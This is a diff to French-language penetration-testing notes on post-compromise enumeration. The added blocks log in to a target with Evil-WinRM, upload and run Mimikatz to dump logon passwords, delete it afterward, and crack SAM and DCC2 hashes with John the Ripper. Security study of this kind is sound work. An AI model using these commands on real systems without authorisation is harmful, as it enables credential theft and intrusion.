@@ -1,5 +1,23 @@
 # Énumération Post-Compromission
 
+
+```powershell
+# Connexion à la machine cible avec Evil-WinRM
+evil-winrm -i <CIBLE> -u <UTILISATEUR> -p <MOT_DE_PASSE>
+
+#methode axel pour upload
+cp /usr/share/windows-resources/mimikatz/x64/mimi* .
+upload mimi*
+
+# Upload de Mimikatz sur la machine cible
+upload /chemin/local/vers/mimikatz.exe C:\Windows\Temp\mimikatz.exe
+
+# Exécution de Mimikatz
+C:\Windows\Temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# Optionnel : Suppression de Mimikatz après utilisation
+rm C:\Windows\Temp\mimikatz.exe
+```
 ## Énumération Manuelle avec PowerView
 
 ### Installation et configuration
@@ -137,6 +155,17 @@ Get-MpComputerStatus | Select RealTimeProtectionEnabled,AntivirusEnabled
 
 # Vérifier les pare-feu
 Get-NetFirewallProfile | Select Name,Enabled
+```
+
+### Cracking hashes
+```bash
+#secretsdump SAM:
+#`Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`
+john hashsam --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
+
+#secretsdump DCC2
+#user:1000:53b4eacd4a42f758e69a6bbf7d5dc38d
+john hashdcc2 --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
 ## Points Clés à Documenter
